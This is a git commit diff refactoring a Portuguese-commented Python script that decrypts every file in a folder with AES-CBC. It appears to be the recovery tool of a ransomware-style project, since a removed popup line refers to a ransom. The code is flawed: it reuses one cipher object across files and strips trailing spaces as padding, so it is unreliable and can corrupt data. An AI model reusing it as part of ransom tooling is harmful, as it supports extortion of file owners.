00ea69d5e5e0224fd25cee84e55f0dd326640f93
Gustmack <42626322+Gustmack@users.noreply.github.com>
2023-10-17 20:26:44 -0300

    Update decriptar.py

--- decriptar.py
+++ decriptar.py
@@ -1,47 +1,43 @@
 import os
 from Crypto.Cipher import AES
 import pickle
-#Adicionado biblioteca Tkinter para abrir janela de aviso
 import tkinter as tk
 from tkinter import messagebox
 
-#Função para adicionar janela de aviso de descriptografia dos arquivos
+
 def show_encryption_message():
     root = tk.Tk()
     root.attributes('-topmost', True)  # Traz a janela para o primeiro plano
     root.withdraw()  # Esconde a janela principal do tkinter
-    messagebox.showwarning("ATENÇÃO", "Identificamos o seu resgate!\nTodos os seus arquivos foram descriptografados")
+    messagebox.showwarning("ATENÇÃO", "Todos os seus arquivos foram descriptografados")
     root.destroy()
 
 
-# Pasta que contém os arquivos criptografados
-caminho_pasta = input("Digite o caminho da pasta que deseja decriptografar:")
+def descriptografar(caminho_pasta, chave_arquivo):
+    # Listar todos os arquivos na pasta
+    arquivos = os.listdir(caminho_pasta)
 
-# Listar todos os arquivos na pasta
-arquivos = os.listdir(caminho_pasta)
+    # Abre o arquivo em modo de leitura de binario ('rb')
+    with open(chave_arquivo, "rb") as arquivo:
+        key, iv = pickle.load(arquivo)
 
-# Abre o arquivo em modo de leitura de binario ('rb')
-with open("chaves", "rb") as arquivo:
-    key, iv = pickle.load(arquivo)
+    # Inicializar o objeto AES para descriptografia
+    cipher = AES.new(key, AES.MODE_CBC, iv)
 
-# Inicializar o objeto AES para descriptografia
-cipher = AES.new(key, AES.MODE_CBC, iv)
+    # Iterar sobre os arquivos e descriptografá-los
+    for arquivo in arquivos:
+        if os.path.isfile(os.path.join(caminho_pasta, arquivo)):
+            with open(os.path.join(caminho_pasta, arquivo), 'rb') as arquivo_criptografado:
+                dados_criptografados = arquivo_criptografado.read()
 
-# Iterar sobre os arquivos e descriptografá-los
-for arquivo in arquivos:
-    if os.path.isfile(os.path.join(caminho_pasta, arquivo)):
-        with open(os.path.join(caminho_pasta, arquivo), 'rb') as arquivo_criptografado:
-            dados_criptografados = arquivo_criptografado.read()
+            # Descriptografar os dados
+            dados_descriptografados = cipher.decrypt(dados_criptografados)
 
-        # Descriptografar os dados
-        dados_descriptografados = cipher.decrypt(dados_criptografados)
+            # Remover o preenchimento (padding) adicionado durante a criptografia
+            dados_descriptografados = dados_descriptografados.rstrip(b' ')
 
-        # Remover o preenchimento (padding) adicionado durante a criptografia
-        dados_descriptografados = dados_descriptografados.rstrip(b' ')
+            # Escrever os dados descriptografados de volta no arquivo
+            with open(os.path.join(caminho_pasta, arquivo), 'wb') as arquivo_original:
+                arquivo_original.write(dados_descriptografados)
 
-        # Escrever os dados descriptografados de volta no arquivo
-        with open(os.path.join(caminho_pasta, arquivo), 'wb') as arquivo_original:
-            arquivo_original.write(dados_descriptografados)
-
-# Chamada da função de jando de Aviso
-show_encryption_message()
+    show_encryption_message()
